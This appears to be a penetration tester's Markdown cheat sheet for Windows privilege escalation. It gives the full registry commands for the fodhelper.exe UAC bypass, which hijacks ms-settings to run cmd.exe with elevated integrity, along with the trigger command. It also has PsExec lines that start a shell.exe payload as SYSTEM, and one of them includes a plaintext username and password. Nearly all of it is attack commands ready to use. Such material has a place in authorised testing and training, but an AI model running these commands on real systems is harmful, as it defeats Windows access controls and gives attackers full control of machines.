# UAC Bypass

---

## Integrity Level Check

Check your current integrity level (look for `Mandatory Label\XXX Mandatory Level`):

```bash
whoami /groups
```

---

## FOD Helper UAC Bypass

- Check if running 64-bit process:

  ```powershell
  [Environment]::Is64BitProcess
  ```

- Registry modifications for bypass:

  ```powershell
  REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
  REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
  REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
  ```

  - The value after `/d` is the command executed with elevated integrity. Use full path if not using `cmd.exe` or `powershell.exe`.

- Trigger the bypass:

  ```powershell
  c:\windows\system32\fodhelper.exe
  ```

---

## Elevate to System Shell from Admin

- Use PowerShell and PsExec for system shell elevation:

  ```powershell
  .\psexec.exe -accepteula -u 'User 1' -p 'tinay09' -s c:\users\public\shell.exe
  .\psexec.exe -accepteula -i -s c:\users\public\shell.exe
  ```

  # -u/-p for credentials, -s for SYSTEM, -i for interactive
